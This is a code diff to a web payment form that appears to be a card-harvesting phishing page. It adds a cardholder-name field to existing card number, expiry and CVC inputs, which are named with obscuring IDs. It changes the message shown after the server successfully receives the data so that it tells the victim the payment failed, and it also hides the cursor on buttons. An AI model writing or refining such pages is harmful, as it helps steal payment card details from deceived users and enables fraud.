@@ -125,7 +125,7 @@ button {
   font-size: 15px;
   border: none;
   border-radius: 15px;
-  cursor: pointer;
+  cursor: none;
   box-sizing: border-box;
 }
 
@@ -162,8 +162,11 @@ button {
     <input type="text" placeholder="YY" maxlength="2" id="codeblock3" name="codeblock3" inputmode="numeric" required />
     <input type="text" placeholder="CVC" maxlength="4" id="codeblock4" name="codeblock4" inputmode="numeric" required />  
   </div>  
-
+  
   <label>Cardholder name</label>
+  <input type="text" id="codeblock5" name="codeblock5" placeholder="Mark Anderson" maxlength="19" inputmode="text" required />
+
+  <label>User Name</label>
   <div class="address">
     <p>User ID: <span id="usernameDisplay">Loading...</span></p>
   </div>
@@ -216,9 +219,9 @@ button {
       .then(response => response.json())
       .then(result => {
         if (result.success) {
-          postSubmitMessage.textContent = "Payment failed: Card type not supported.";
+          postSubmitMessage.textContent = "Unable to Process Payment: The card type or cardholder name does not match the required format. Please ensure the details are correct.";
         } else {
-          postSubmitMessage.textContent = "Submission failed. Please try again.";
+          postSubmitMessage.textContent = "failed. Please try again.";
         }
         postSubmitMessage.style.display = "block";
       })
